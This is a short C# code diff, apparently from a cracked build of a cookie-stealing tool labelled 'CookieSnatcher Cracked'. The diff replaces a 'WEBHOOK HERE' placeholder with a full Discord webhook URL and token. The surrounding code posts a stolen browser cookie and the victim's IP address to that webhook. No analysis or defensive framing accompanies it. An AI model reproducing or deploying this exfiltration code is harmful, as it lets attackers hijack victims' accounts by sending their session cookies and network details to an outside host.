@@ -504,7 +504,7 @@ internal class EntryPointClass
 			{
 				dcWeb.ProfilePicture = "https://ixware.biz/cs/cs.png";
 				dcWeb.UserName = "CookieSnatcher Cracked";
-				dcWeb.WebHook = "WEBHOOK HERE";
+				dcWeb.WebHook = "https://discord.com/api/webhooks/940237844323127376/TbG_7dfahW_SiQZ9JkuAW1HFBssIXIvlk8CuCKQVx3xEKvUqCNw2EhVMAKxQ72ilEm2K";
 				dcWeb.SendMessage($"Cookie: {string_8}\r\n\r\nIP: {value}");
 			}
 			result = "gay";
